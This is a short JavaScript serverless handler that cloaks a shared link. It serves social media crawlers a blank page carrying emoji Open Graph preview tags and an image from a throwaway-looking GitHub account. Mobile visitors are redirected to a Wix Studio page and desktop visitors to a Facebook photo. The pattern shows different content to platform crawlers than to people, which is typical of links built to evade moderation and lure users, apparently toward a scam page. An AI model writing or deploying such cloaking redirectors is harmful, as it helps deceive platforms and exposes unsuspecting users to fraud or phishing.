export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="🎬💪💪🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://raw.githubusercontent.com/jkauwajakinngg-gif/reimagined-spork/f59f560b70b66c77eac85514d669e087aee17f65/4.svg?utm_source=flipboard&utm_content=ImkanaJaan%2Fmagazine%2Ft7iywq">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://jkauwajakinngg.wixstudio.com/yhgiesx", 302);
  } else {
    return Response.redirect("https://web.facebook.com/photo.php?fbid=10116914317858221&set=pb.4.-2207520000&type=3", 302);
  }
}
